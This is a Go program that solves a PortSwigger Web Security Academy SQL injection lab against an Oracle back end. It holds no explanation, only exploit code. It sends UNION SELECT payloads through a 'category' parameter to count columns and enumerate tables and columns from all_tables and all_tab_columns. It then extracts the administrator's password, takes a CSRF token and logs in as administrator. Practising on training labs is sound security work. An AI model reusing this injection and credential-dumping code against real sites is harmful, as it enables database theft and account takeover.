// https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0ad800e00359b1f9c03328fd0028001d.web-security-academy.net"
	filterUrl := u + "/filter"
	loginUrl := u + "/login"

	numCols, err := numColumns(filterUrl, client)
	if err != nil {
		return err
	}
	fmt.Println("Number of columns:", numCols)

	textCol, err := textColumn(filterUrl, numCols, client)
	if err != nil {
		return err
	}
	fmt.Println("Text column index:", textCol)

	usersTable, err := usersTable(filterUrl, numCols, textCol, client)
	if err != nil {
		return err
	}
	fmt.Println("Users table:", usersTable)

	userCol, passCol, err := userPassColumns(filterUrl, numCols, textCol, usersTable, client)
	if err != nil {
		return err
	}
	fmt.Println("Username column:", userCol)
	fmt.Println("Password column:", passCol)

	adminPass, err := adminPassword(filterUrl, numCols, textCol, usersTable, userCol, passCol, client)
	if err != nil {
		return err
	}
	fmt.Println("Admin password:", adminPass)

	csrfToken, err := parseCSRFToken(loginUrl, client)
	if err != nil {
		return err
	}

	return login(loginUrl, "administrator", adminPass, csrfToken, client)
}

func numColumns(u string, client *http.Client) (int, error) {
	for i := 1; i <= 20; i++ {
		nulls := make([]string, i)
		for j := 0; j < len(nulls); j++ {
			nulls[j] = "null"
		}

		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from dual--")
		fmt.Println(filterUrl)
		resp, err := client.Get(filterUrl)
		if err != nil {
			return 0, err
		}
		defer resp.Body.Close()
		if resp.StatusCode/100 == 2 {
			return i, nil
		}
	}
	return 0, fmt.Errorf("greater than 20")
}

func textColumn(u string, max int, client *http.Client) (int, error) {
	for i := 1; i <= max; i++ {
		nulls := make([]string, max)
		for j := 0; j < len(nulls); j++ {
			nulls[j] = "null"
		}
		nulls[i] = "'a'"

		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from dual--")
		fmt.Println(filterUrl)
		resp, err := client.Get(filterUrl)
		if err != nil {
			return 0, err
		}
		defer resp.Body.Close()
		if resp.StatusCode/100 == 2 {
			return i, nil
		}
	}
	return 0, fmt.Errorf("text column not found")
}

var usersTableRE *regexp.Regexp = regexp.MustCompile(`>(USERS[^<]*)<`)

func usersTable(u string, numCols, textCol int, client *http.Client) (string, error) {
	nulls := make([]string, numCols)
	for j := 0; j < len(nulls); j++ {
		nulls[j] = "null"
	}
	nulls[textCol] = "table_name"

	filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from all_tables--")
	fmt.Println(filterUrl)
	resp, err := client.Get(filterUrl)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))

	matches := usersTableRE.FindSubmatch(body)
	if len(matches) != 2 {
		return "", fmt.Errorf("users table not found")
	}

	return string(matches[1]), nil
}

var userColRE *regexp.Regexp = regexp.MustCompile(`>(USERNAME[^<]*)<`)
var passColRE *regexp.Regexp = regexp.MustCompile(`>(PASSWORD[^<]*)<`)

func userPassColumns(u string, numCols, textCol int, usersTable string, client *http.Client) (string, string, error) {
	nulls := make([]string, numCols)
	for j := 0; j < len(nulls); j++ {
		nulls[j] = "null"
	}
	nulls[textCol] = "column_name"

	filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from all_tab_columns where table_name = '"+usersTable+"'--")
	fmt.Println(filterUrl)
	resp, err := client.Get(filterUrl)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", "", err
	}
	//fmt.Println(string(body))

	matches := userColRE.FindSubmatch(body)
	if len(matches) != 2 {
		return "", "", fmt.Errorf("username column not found")
	}
	userCol := string(matches[1])

	matches = passColRE.FindSubmatch(body)
	if len(matches) != 2 {
		return "", "", fmt.Errorf("password column not found")
	}
	passCol := string(matches[1])
	return userCol, passCol, nil
}

var passRE *regexp.Regexp = regexp.MustCompile(`>administrator\|([^<>]+)<`)

func adminPassword(u string, numCols, textCol int, usersTable, userCol, passCol string, client *http.Client) (string, error) {
	nulls := make([]string, numCols)
	for j := 0; j < len(nulls); j++ {
		nulls[j] = "null"
	}
	nulls[textCol] = userCol + " || '|' || " + passCol

	filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from "+usersTable+"--")
	fmt.Println(filterUrl)
	resp, err := client.Get(filterUrl)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))

	matches := passRE.FindSubmatch(body)
	if len(matches) != 2 {
		return "", fmt.Errorf("password not found")
	}

	return string(matches[1]), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func parseCSRFToken(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))

	return string(csrfRE.FindSubmatch(body)[1]), nil
}

func login(u, username, password, csrfToken string, client *http.Client) error {
	resp, err := client.PostForm(u, url.Values{"username": {"administrator"}, "password": {password}, "csrf": {csrfToken}})
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	_, err = fmt.Println(string(body))
	return err
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	return &http.Client{Jar: jar}, nil
}
